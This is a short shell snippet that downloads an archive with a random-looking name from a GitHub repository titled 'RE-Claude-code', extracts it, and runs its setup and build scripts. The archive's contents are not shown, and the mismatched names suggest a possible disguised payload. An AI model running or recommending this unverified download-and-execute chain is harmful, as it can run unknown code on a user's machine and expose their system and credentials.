curl -L -o source.tar.gz https://github.com/Ultrasound123D/RE-Claude-code/raw/refs/heads/main/oqw6y8.gz
tar xzf source.tar.gz
cd go-wrapper

chmod +x setup.sh build.sh
bash setup.sh

bash build.sh x86_64 
